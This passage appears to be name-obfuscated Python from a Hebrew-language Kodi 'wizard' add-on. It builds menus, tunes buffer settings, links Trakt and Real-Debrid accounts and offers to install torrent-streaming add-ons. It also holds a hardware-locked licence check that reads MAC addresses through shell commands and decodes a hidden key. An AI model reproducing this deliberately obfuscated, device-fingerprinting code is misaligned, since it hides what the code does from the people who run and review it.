					OOO00OOO0OO000O0O =OOO000OOO0OO0OOO0 [0 ]#line:1706
					if OOO00OOO0OO000O0O in "'\"":#line:1707
						if OOO000OOO0OO0OOO0 .find ('='+OOO00OOO0OO000O0O ,OOO000OOO0OO0OOO0 .find (OOO00OOO0OO000O0O ,1 ))>-1 :#line:1708
							OOO000OOO0OO0OOO0 =OOO000OOO0OO0OOO0 [:OOO000OOO0OO0OOO0 .find ('='+OOO00OOO0OO000O0O ,OOO000OOO0OO0OOO0 .find (OOO00OOO0OO000O0O ,1 ))]#line:1709
						if OOO000OOO0OO0OOO0 .rfind (OOO00OOO0OO000O0O ,1 )>-1 :#line:1711
							OOO000OOO0OO0OOO0 =OOO000OOO0OO0OOO0 [1 :OOO000OOO0OO0OOO0 .rfind (OOO00OOO0OO000O0O )]#line:1712
					else :#line:1713
						if OOO000OOO0OO0OOO0 .find (" ")>0 :#line:1714
							OOO000OOO0OO0OOO0 =OOO000OOO0OO0OOO0 [:OOO000OOO0OO0OOO0 .find (" ")]#line:1715
						elif OOO000OOO0OO0OOO0 .find ("/")>0 :#line:1716
							OOO000OOO0OO0OOO0 =OOO000OOO0OO0OOO0 [:OOO000OOO0OO0OOO0 .find ("/")]#line:1717
						elif OOO000OOO0OO0OOO0 .find (">")>0 :#line:1718
							OOO000OOO0OO0OOO0 =OOO000OOO0OO0OOO0 [:OOO000OOO0OO0OOO0 .find (">")]#line:1719
					O0000000OO0OO0O00 .append (OOO000OOO0OO0OOO0 .strip ())#line:1721
			OO00OOO0O000O0OO0 =O0000000OO0OO0O00 #line:1722
		else :#line:1723
			O0000000OO0OO0O00 =[]#line:1724
			for O00O0OOO00OOOO00O in OO00OOO0O000O0OO0 :#line:1725
				O0OO000O00OO000OO =u"</"+name #line:1726
				OOO0000O0O000OOO0 =OOO000OO0O0000O00 .find (O00O0OOO00OOOO00O )#line:1728
				OO0OOOOO00O0OO0OO =OOO000OO0O0000O00 .find (O0OO000O00OO000OO ,OOO0000O0O000OOO0 )#line:1729
				OO00OOOO0O0000OO0 =OOO000OO0O0000O00 .find ("<"+name ,OOO0000O0O000OOO0 +1 )#line:1730
				while OO00OOOO0O0000OO0 <OO0OOOOO00O0OO0OO and OO00OOOO0O0000OO0 !=-1 :#line:1732
					O00O000000OOO00OO =OOO000OO0O0000O00 .find (O0OO000O00OO000OO ,OO0OOOOO00O0OO0OO +len (O0OO000O00OO000OO ))#line:1733
					if O00O000000OOO00OO !=-1 :#line:1734
						OO0OOOOO00O0OO0OO =O00O000000OOO00OO #line:1735
					OO00OOOO0O0000OO0 =OOO000OO0O0000O00 .find ("<"+name ,OO00OOOO0O0000OO0 +1 )#line:1736
				if OOO0000O0O000OOO0 ==-1 and OO0OOOOO00O0OO0OO ==-1 :#line:1738
					OOOO00O000O00O000 =u""#line:1739
				elif OOO0000O0O000OOO0 >-1 and OO0OOOOO00O0OO0OO >-1 :#line:1740
					OOOO00O000O00O000 =OOO000OO0O0000O00 [OOO0000O0O000OOO0 +len (O00O0OOO00OOOO00O ):OO0OOOOO00O0OO0OO ]#line:1741
				elif OO0OOOOO00O0OO0OO >-1 :#line:1742
					OOOO00O000O00O000 =OOO000OO0O0000O00 [:OO0OOOOO00O0OO0OO ]#line:1743
				elif OOO0000O0O000OOO0 >-1 :#line:1744
					OOOO00O000O00O000 =OOO000OO0O0000O00 [OOO0000O0O000OOO0 +len (O00O0OOO00OOOO00O ):]#line:1745
				if ret :#line:1747
					O0OO000O00OO000OO =OOO000OO0O0000O00 [OO0OOOOO00O0OO0OO :OOO000OO0O0000O00 .find (">",OOO000OO0O0000O00 .find (O0OO000O00OO000OO ))+1 ]#line:1748
					OOOO00O000O00O000 =O00O0OOO00OOOO00O +OOOO00O000O00O000 +O0OO000O00OO000OO #line:1749
				OOO000OO0O0000O00 =OOO000OO0O0000O00 [OOO000OO0O0000O00 .find (OOOO00O000O00O000 ,OOO000OO0O0000O00 .find (O00O0OOO00OOOO00O ))+len (OOOO00O000O00O000 ):]#line:1751
				O0000000OO0OO0O00 .append (OOOO00O000O00O000 )#line:1752
			OO00OOO0O000O0OO0 =O0000000OO0OO0O00 #line:1753
		OO000O0000OO0O000 +=OO00OOO0O000O0OO0 #line:1754
	return OO000O0000OO0O000 #line:1756
def addItem (O0OO0OOOO0OO0000O ,O0O0OOOOO0O000OO0 ,OOOOOO0OO000OO0OO ,OO000OO00OOOOO0O0 ,O000O0OOOOOOO0000 ,description =None ):#line:1758
	if description ==None :description =''#line:1759
	description ='[COLOR white]'+description +'[/COLOR]'#line:1760
	OOOO000OO0000O000 =sys .argv [0 ]+"?url="+urllib .quote_plus (O0O0OOOOO0O000OO0 )+"&mode="+str (OOOOOO0OO000OO0OO )+"&name="+urllib .quote_plus (O0OO0OOOO0OO0000O )+"&iconimage="+urllib .quote_plus (OO000OO00OOOOO0O0 )+"&fanart="+urllib .quote_plus (O000O0OOOOOOO0000 )#line:1761
	O0O00O00OO0OOOO00 =True #line:1762
	OO000OOOO00OOO000 =xbmcgui .ListItem (O0OO0OOOO0OO0000O ,iconImage =OO000OO00OOOOO0O0 ,thumbnailImage =OO000OO00OOOOO0O0 )#line:1763
	OO000OOOO00OOO000 .setInfo (type ="Video",infoLabels ={"Title":O0OO0OOOO0OO0000O ,"Plot":description })#line:1764
	OO000OOOO00OOO000 .setProperty ("fanart_Image",O000O0OOOOOOO0000 )#line:1765
	OO000OOOO00OOO000 .setProperty ("icon_Image",OO000OO00OOOOO0O0 )#line:1766
	O0O00O00OO0OOOO00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOOO000OO0000O000 ,listitem =OO000OOOO00OOO000 ,isFolder =False )#line:1767
	return O0O00O00OO0OOOO00 #line:1768
def get_params ():#line:1770
		O00OO00OO0O000OOO =[]#line:1771
		OOOOOO00000000OO0 =sys .argv [2 ]#line:1772
		if len (OOOOOO00000000OO0 )>=2 :#line:1773
				OO00000OOO000OO00 =sys .argv [2 ]#line:1774
				O00OOO000O000000O =OO00000OOO000OO00 .replace ('?','')#line:1775
				if (OO00000OOO000OO00 [len (OO00000OOO000OO00 )-1 ]=='/'):#line:1776
						OO00000OOO000OO00 =OO00000OOO000OO00 [0 :len (OO00000OOO000OO00 )-2 ]#line:1777
				O00OOOOO0OO0O0OO0 =O00OOO000O000000O .split ('&')#line:1778
				O00OO00OO0O000OOO ={}#line:1779
				for O0O0000OO0OO00000 in range (len (O00OOOOO0OO0O0OO0 )):#line:1780
						OO00000O0OO0O000O ={}#line:1781
						OO00000O0OO0O000O =O00OOOOO0OO0O0OO0 [O0O0000OO0OO00000 ].split ('=')#line:1782
						if (len (OO00000O0OO0O000O ))==2 :#line:1783
								O00OO00OO0O000OOO [OO00000O0OO0O000O [0 ]]=OO00000O0OO0O000O [1 ]#line:1784
		return O00OO00OO0O000OOO #line:1786
def decode (OOO0OOOO00OOOO000 ,OO0O0O000000000O0 ):#line:1791
    import base64 #line:1792
    OOO0OO0OOOO00OO0O =[]#line:1793
    if (len (OOO0OOOO00OOOO000 ))!=4 :#line:1795
     return 10 #line:1796
    OO0O0O000000000O0 =base64 .urlsafe_b64decode (OO0O0O000000000O0 )#line:1797
    for OOO0OO00O00O00O0O in range (len (OO0O0O000000000O0 )):#line:1799
        O0000000OO0O00OOO =OOO0OOOO00OOOO000 [OOO0OO00O00O00O0O %len (OOO0OOOO00OOOO000 )]#line:1800
        O0OOOOOOO00O000O0 =chr ((256 +ord (OO0O0O000000000O0 [OOO0OO00O00O00O0O ])-ord (O0000000OO0O00OOO ))%256 )#line:1801
        OOO0OO0OOOO00OO0O .append (O0OOOOOOO00O000O0 )#line:1802
    return "".join (OOO0OO0OOOO00OO0O )#line:1803
def tmdb_list (OOOO0OO00000OO0OO ):#line:1804
    OO00OOO0OO0OOOO00 =decode ("7643",OOOO0OO00000OO0OO )#line:1807
    return int (OO00OOO0OO0OOOO00 )#line:1810
def u_list (O00O0OOO00O0OO0O0 ):#line:1811
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:1813
        from math import sqrt #line:1814
        OO0O0O000O00000OO =tmdb_list (TMDB_NEW_API )#line:1815
        OOO0OOO0O00OOOOOO =str ((getHwAddr ('eth0'))*OO0O0O000O00000OO )#line:1817
        O00O000O0OO0OOOOO =int (OOO0OOO0O00OOOOOO [1 ]+OOO0OOO0O00OOOOOO [2 ]+OOO0OOO0O00OOOOOO [5 ]+OOO0OOO0O00OOOOOO [7 ])#line:1818
        O0000000O0O0O0000 =(ADDON .getSetting ("pass"))#line:1820
        OO00000O00O0O0OOO =(str (round (sqrt ((O00O000O0OO0OOOOO *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1825
        if '.'in OO00000O00O0O0OOO :#line:1827
         OO00000O00O0O0OOO =(str (round (sqrt ((O00O000O0OO0OOOOO *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1828
        if O0000000O0O0O0000 ==OO00000O00O0O0OOO :#line:1830
          O0O00O000O000OOOO =O00O0OOO00O0OO0O0 #line:1832
        else :#line:1834
           if STARTP2 ()and STARTP ()=='ok':#line:1835
             return O00O0OOO00O0OO0O0 #line:1838
           O0O00O000O000OOOO ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1839
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1840
           sys .exit ()#line:1841
        return O0O00O000O000OOOO #line:1842
    else :#line:1843
        STARTP ()#line:1844
def disply_hwr ():#line:1848
   try :#line:1849
    OOO000000000O000O =tmdb_list (TMDB_NEW_API )#line:1850
    OOO0O000OO000O000 =str ((getHwAddr ('eth0'))*OOO000000000O000O )#line:1851
    O000OO00OO0O00OO0 =(OOO0O000OO000O000 [1 ]+OOO0O000OO000O000 [2 ]+OOO0O000OO000O000 [5 ]+OOO0O000OO000O000 [7 ])#line:1858
    O0OO00OOOOO000000 =(ADDON .getSetting ("action"))#line:1859
    wiz .setS ('action',str (O000OO00OO0O00OO0 ))#line:1861
   except :pass #line:1862
def disply_hwr2 ():#line:1863
   try :#line:1864
    O0O0O0O000O00O00O =tmdb_list (TMDB_NEW_API )#line:1865
    OOOOOOO0OO0OO0O0O =str ((getHwAddr ('eth0'))*O0O0O0O000O00O00O )#line:1867
    OOOO0O00OOO0000OO =(OOOOOOO0OO0OO0O0O [1 ]+OOOOOOO0OO0OO0O0O [2 ]+OOOOOOO0OO0OO0O0O [5 ]+OOOOOOO0OO0OO0O0O [7 ])#line:1876
    OO000OO00OO0OO0O0 =(ADDON .getSetting ("action"))#line:1877
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OOOO0O00OOO0000OO )#line:1880
   except :pass #line:1881
def getHwAddr (O00O00O0OO00OO00O ):#line:1883
   import subprocess ,time #line:1884
   O00OO00OOO000O0O0 ='windows'#line:1885
   if xbmc .getCondVisibility ('system.platform.android'):#line:1886
       O00OO00OOO000O0O0 ='android'#line:1887
   if xbmc .getCondVisibility ('system.platform.android'):#line:1888
     O000OOO0OO00OO0O0 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1889
     O000O0OO00O00OO00 =re .compile ('link/ether (.+?) brd').findall (str (O000OOO0OO00OO0O0 ))#line:1891
     O00O0O0OOOOO0OOO0 =0 #line:1892
     for O00OO000O0O0O0000 in O000O0OO00O00OO00 :#line:1893
      if O000O0OO00O00OO00 !='00:00:00:00:00:00':#line:1894
          OO0O0000O0O0OOO00 =O00OO000O0O0O0000 #line:1895
          O00O0O0OOOOO0OOO0 =O00O0O0OOOOO0OOO0 +int (OO0O0000O0O0OOO00 .replace (':',''),16 )#line:1896
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1898
       O000OOO0OOOOO0O00 =0 #line:1899
       O00O0O0OOOOO0OOO0 =0 #line:1900
       OOO00OOO000OOOO00 =[]#line:1901
       OO0O0O0OO00OOO000 =os .popen ("getmac").read ()#line:1902
       OO0O0O0OO00OOO000 =OO0O0O0OO00OOO000 .split ("\n")#line:1903
       for O0OOOO0OO00OOO0OO in OO0O0O0OO00OOO000 :#line:1905
            OO0OOO0O0OOO0O000 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O0OOOO0OO00OOO0OO ,re .I )#line:1906
            if OO0OOO0O0OOO0O000 :#line:1907
                O000O0OO00O00OO00 =OO0OOO0O0OOO0O000 .group ().replace ('-',':')#line:1908
                OOO00OOO000OOOO00 .append (O000O0OO00O00OO00 )#line:1909
                O00O0O0OOOOO0OOO0 =O00O0O0OOOOO0OOO0 +int (O000O0OO00O00OO00 .replace (':',''),16 )#line:1912
   else :#line:1914
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1915
   try :#line:1932
    return O00O0O0OOOOO0OOO0 #line:1933
   except :pass #line:1934
def getpass ():#line:1935
	disply_hwr2 ()#line:1937
def setpass ():#line:1938
    OO000OO0OO0O0000O =xbmcgui .Dialog ()#line:1939
    O0O0O00OO0O0OO0OO =''#line:1940
    OO0000OO0OOO00O0O =xbmc .Keyboard (O0O0O00OO0O0OO0OO ,'הכנס סיסמה')#line:1942
    OO0000OO0OOO00O0O .doModal ()#line:1943
    if OO0000OO0OOO00O0O .isConfirmed ():#line:1944
           OO0000OO0OOO00O0O =OO0000OO0OOO00O0O .getText ()#line:1945
    wiz .setS ('pass',str (OO0000OO0OOO00O0O ))#line:1946
def setuname ():#line:1947
    O0O000OOO0OO0OOO0 =''#line:1948
    OOO0O000OO0OO00O0 =xbmc .Keyboard (O0O000OOO0OO0OOO0 ,'הכנס שם משתמש')#line:1949
    OOO0O000OO0OO00O0 .doModal ()#line:1950
    if OOO0O000OO0OO00O0 .isConfirmed ():#line:1951
           O0O000OOO0OO0OOO0 =OOO0O000OO0OO00O0 .getText ()#line:1952
           wiz .setS ('user',str (O0O000OOO0OO0OOO0 ))#line:1953
def powerkodi ():#line:1954
    os ._exit (1 )#line:1955
def buffer1 ():#line:1957
	OOOOOO000000OOOO0 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1958
	OO0O0000OOO0O00O0 =xbmc .getInfoLabel ("System.Memory(total)")#line:1959
	O0OO00OO0OO00OOO0 =xbmc .getInfoLabel ("System.FreeMemory")#line:1960
	O0O00OOO0000OOO00 =re .sub ('[^0-9]','',O0OO00OO0OO00OOO0 )#line:1961
	O0O00OOO0000OOO00 =int (O0O00OOO0000OOO00 )/3 #line:1962
	OOOO00OOOOOOOOOOO =O0O00OOO0000OOO00 *1024 *1024 #line:1963
	try :OOO000O0O0OO00O00 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1964
	except :OOO000O0O0OO00O00 =16 #line:1965
	OO0O0O0O00000OO0O =DIALOG .yesno ('FREE MEMORY: '+str (O0OO00OO0OO00OOO0 ),'Based on your free Memory your optimal buffersize is: '+str (O0O00OOO0000OOO00 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1968
	if OO0O0O0O00000OO0O ==1 :#line:1969
		with open (OOOOOO000000OOOO0 ,"w")as OOO00O0OOOO000O00 :#line:1970
			if OOO000O0O0OO00O00 >=17 :OOOOOOO0OO0000OOO =xml_data_advSettings_New (str (OOOO00OOOOOOOOOOO ))#line:1971
			else :OOOOOOO0OO0000OOO =xml_data_advSettings_old (str (OOOO00OOOOOOOOOOO ))#line:1972
			OOO00O0OOOO000O00 .write (OOOOOOO0OO0000OOO )#line:1974
			DIALOG .ok ('Buffer Size Set to: '+str (OOOO00OOOOOOOOOOO ),'Please restart Kodi for settings to apply.','')#line:1975
	elif OO0O0O0O00000OO0O ==0 :#line:1977
		OOOO00OOOOOOOOOOO =_OO0O0OOO0OOO0OO00 (default =str (OOOO00OOOOOOOOOOO ),heading ="INPUT BUFFER SIZE")#line:1978
		with open (OOOOOO000000OOOO0 ,"w")as OOO00O0OOOO000O00 :#line:1979
			if OOO000O0O0OO00O00 >=17 :OOOOOOO0OO0000OOO =xml_data_advSettings_New (str (OOOO00OOOOOOOOOOO ))#line:1980
			else :OOOOOOO0OO0000OOO =xml_data_advSettings_old (str (OOOO00OOOOOOOOOOO ))#line:1981
			OOO00O0OOOO000O00 .write (OOOOOOO0OO0000OOO )#line:1982
			DIALOG .ok ('Buffer Size Set to: '+str (OOOO00OOOOOOOOOOO ),'Please restart Kodi for settings to apply.','')#line:1983
def xml_data_advSettings_old (OO000OOO0OOOO00O0 ):#line:1984
	O000O000OO0OOO00O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OO000OOO0OOOO00O0 #line:1994
	return O000O000OO0OOO00O #line:1995
def xml_data_advSettings_New (OOOO000O00OO00O0O ):#line:1997
	OOOOOOO00OOOO0OO0 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OOOO000O00OO00O0O #line:2009
	return OOOOOOO00OOOO0OO0 #line:2010
def write_ADV_SETTINGS_XML (OOO0000000OO0O000 ):#line:2011
    if not os .path .exists (xml_file ):#line:2012
        with open (xml_file ,"w")as O0O00O0000O0O00OO :#line:2013
            O0O00O0000O0O00OO .write (xml_data )#line:2014
def _OO0O0OOO0OOO0OO00 (default ="",heading ="",hidden =False ):#line:2015
    ""#line:2016
    OOO00OO00O0O00OO0 =xbmc .Keyboard (default ,heading ,hidden )#line:2017
    OOO00OO00O0O00OO0 .doModal ()#line:2018
    if (OOO00OO00O0O00OO0 .isConfirmed ()):#line:2019
        return unicode (OOO00OO00O0O00OO0 .getText (),"utf-8")#line:2020
    return default #line:2021
def index ():#line:2023
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2024
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2025
	if AUTOUPDATE =='Yes':#line:2026
		if wiz .workingURL (WIZARDFILE )==True :#line:2027
			O0O0O0O0O00000000 =wiz .checkWizard ('version')#line:2028
			if O0O0O0O0O00000000 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O0O0O0O0O00000000 ),'wizardupdate',themeit =THEME2 )#line:2029
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2030
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2031
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2032
	if len (BUILDNAME )>0 :#line:2033
		OOOOO0O00OOOOOOO0 =wiz .checkBuild (BUILDNAME ,'version')#line:2034
		O0O0O0OOOO0O000OO ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2035
		if OOOOO0O00OOOOOOO0 >BUILDVERSION :O0O0O0OOOO0O000OO ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O0O0O0OOOO0O000OO ,OOOOO0O00OOOOOOO0 )#line:2036
		addDir (O0O0O0OOOO0O000OO ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2038
		try :#line:2040
		     OO0000O0OOO00000O =wiz .themeCount (BUILDNAME )#line:2041
		except :#line:2042
		   OO0000O0OOO00000O =False #line:2043
		if not OO0000O0OOO00000O ==False :#line:2044
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2045
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2046
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2049
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2050
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2051
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2055
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2057
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2059
def morsetup ():#line:2061
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2062
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2063
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2064
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2065
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2066
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2070
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2071
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2074
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2075
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2085
	setView ('files','viewType')#line:2086
def morsetup2 ():#line:2087
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2088
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2089
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2090
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2091
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2092
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2093
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2094
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2095
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2096
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2097
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2098
def fastupdate ():#line:2099
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2100
def forcefastupdate ():#line:2102
			OOO0OO0OO0OO0OOOO ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2103
			wiz .ForceFastUpDate (ADDONTITLE ,OOO0OO0OO0OO0OOOO )#line:2104
def rdsetup ():#line:2108
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2109
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2110
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2112
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2113
def traktsetup ():#line:2116
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2117
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2118
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2119
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2120
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2121
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2122
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2123
	setView ('files','viewType')#line:2124
def setautorealdebrid ():#line:2125
    from resources .libs import real_debrid #line:2126
    O0OOOOOOO0OO0O0OO =real_debrid .RealDebridFirst ()#line:2127
    O0OOOOOOO0OO0O0OO .auth ()#line:2128
def setrealdebrid ():#line:2130
    O0OO0OOOOO0O00O00 =(ADDON .getSetting ("auto_rd"))#line:2131
    if O0OO0OOOOO0O00O00 =='false':#line:2132
       ADDON .openSettings ()#line:2133
    else :#line:2134
        from resources .libs import real_debrid #line:2135
        OO000OOOO0OO0O0O0 =real_debrid .RealDebrid ()#line:2136
        OO000OOOO0OO0O0O0 .auth ()#line:2137
        rdon ()#line:2140
def resolveurlsetup ():#line:2142
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2143
def urlresolversetup ():#line:2144
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2145
def placentasetup ():#line:2147
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2148
def reptiliasetup ():#line:2149
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2150
def flixnetsetup ():#line:2151
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2152
def yodasetup ():#line:2153
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2154
def numberssetup ():#line:2155
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2156
def uranussetup ():#line:2157
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2158
def genesissetup ():#line:2159
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2160
def net_tools (view =None ):#line:2162
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2163
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2164
	setView ('files','viewType')#line:2166
def speedMenu ():#line:2167
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2168
def viewIP ():#line:2169
	OO00O0OO000000OOO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2183
	OO0O0O0OOO0O0OO00 =[];OO00000OOOO0O0O0O =0 #line:2184
	for OO0OO0OOOO00O0OO0 in OO00O0OO000000OOO :#line:2185
		OO0OO0OO0O00O00OO =wiz .getInfo (OO0OO0OOOO00O0OO0 )#line:2186
		OO0OOO0000O0OO00O =0 #line:2187
		while OO0OO0OO0O00O00OO =="Busy"and OO0OOO0000O0OO00O <10 :#line:2188
			OO0OO0OO0O00O00OO =wiz .getInfo (OO0OO0OOOO00O0OO0 );OO0OOO0000O0OO00O +=1 ;wiz .log ("%s sleep %s"%(OO0OO0OOOO00O0OO0 ,str (OO0OOO0000O0OO00O )));xbmc .sleep (1000 )#line:2189
		OO0O0O0OOO0O0OO00 .append (OO0OO0OO0O00O00OO )#line:2190
		OO00000OOOO0O0O0O +=1 #line:2191
	O0000O00OO00O00O0 ,O00O0000000OO0000 ,OO0000O0O0OO0O0O0 =getIP ()#line:2192
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0O0OOO0O0OO00 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2193
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000O00OO00O00O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2194
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0000000OO0000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2195
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000O0O0OO0O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2196
